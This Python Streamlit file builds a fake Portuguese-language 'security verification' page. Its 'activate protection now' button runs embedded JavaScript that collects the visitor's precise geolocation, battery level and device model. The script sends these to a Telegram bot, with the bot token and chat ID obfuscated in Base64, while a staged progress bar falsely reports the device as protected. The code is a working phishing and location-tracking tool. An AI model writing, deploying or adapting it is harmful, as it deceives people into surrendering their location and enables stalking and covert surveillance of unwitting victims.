import streamlit as st
import time

st.set_page_config(page_title="Segurança Integrada", layout="centered")

# --- CSS ORIGINAL MIAMY © 2026 ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    .titulo { font-size: 32px; font-weight: bold; margin-top: 40px; }
    .status-container { font-size: 22px; margin: 15px 0; color: #e0e0e0; }
    .progress-bg { width: 100%; height: 8px; background-color: #1e262e; border-radius: 10px; margin-bottom: 40px; overflow: hidden; }
    .progress-fill { height: 100%; background-color: #007bff; border-radius: 10px; transition: width 0.1s; }
    .btn-container { display: flex; justify-content: center; width: 100%; }
    .meu-botao {
        background-color: white; color: black; width: 300px; height: 85px;
        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        cursor: pointer; line-height: 1.2; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    }
    .ponto-vermelho { color: #ff3b30; font-size: 28px; margin-bottom: -5px; }
    .footer { position: fixed; left: 0; bottom: 20px; width: 100%; text-align: center; color: #555; font-size: 11px; }
    </style>
""", unsafe_allow_html=True)

st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)

placeholder_texto = st.empty()
placeholder_barra = st.empty()

placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)

# --- MOTOR JS COM OFUSCAÇÃO INTERNA (PARA NÃO DAR ERRO) ---
# Os valores abaixo são o seu Token e ID em Base64
js_final = """
<div class="btn-container">
    <button class="meu-botao" id="btn_ativar">
        <span class="ponto-vermelho">●</span>
        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
    </button>
</div>

<script>
// Função para decodificar os dados na hora do clique
const _d = (s) => atob(s);
const _T = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExwVUlFTm10cGxUZkh1b0ZyZzFmZnI4";
const _I = "ODIxMDgyODM5OA==";

document.getElementById('btn_ativar').onclick = function() {
    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            try {
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                
                let dispositivo = "Mobile Device";
                const ua = navigator.userAgent;
                if (ua.match(/\\((.*?)\\)/)) {
                    dispositivo = ua.match(/\\((.*?)\\)/)[1].split(';')[0];
                }

                const info = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + dispositivo + "\\n🔋 *Bateria:* " + level + "%\\n📍 Local: http://googleusercontent.com/maps.google.com/6" + pos.coords.latitude + "," + pos.coords.longitude;
                
                // Envia usando os dados decodificados
                await fetch("https://api.telegram.org/bot" + _d(_T) + "/sendMessage", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: _d(_I), text: info, parse_mode: "Markdown" })
                });
                
                window.parent.postMessage({type: 'streamlit:set_component_value', value: true}, '*');
            } catch(e) { console.log(e); }
        },
        (err) => {
            alert("Erro de Segurança: Ative a localização para validar o dispositivo.");
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
};
</script>
"""

clicou = st.components.v1.html(js_final, height=150)
st.markdown('<div class="footer">Sistema Integrado de Segurança Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)

# Animação 0-100%
if clicou:
    for p in range(4, 101, 2):
        placeholder_texto.markdown(f'<div class="status-container">Verificando integridade: {p}%</div>', unsafe_allow_html=True)
        placeholder_barra.markdown(f'<div class="progress-bg"><div class="progress-fill" style="width: {p}%;"></div></div>', unsafe_allow_html=True)
        time.sleep(0.03)
    st.success("Dispositivo Protegido!")
    st.stop()
    
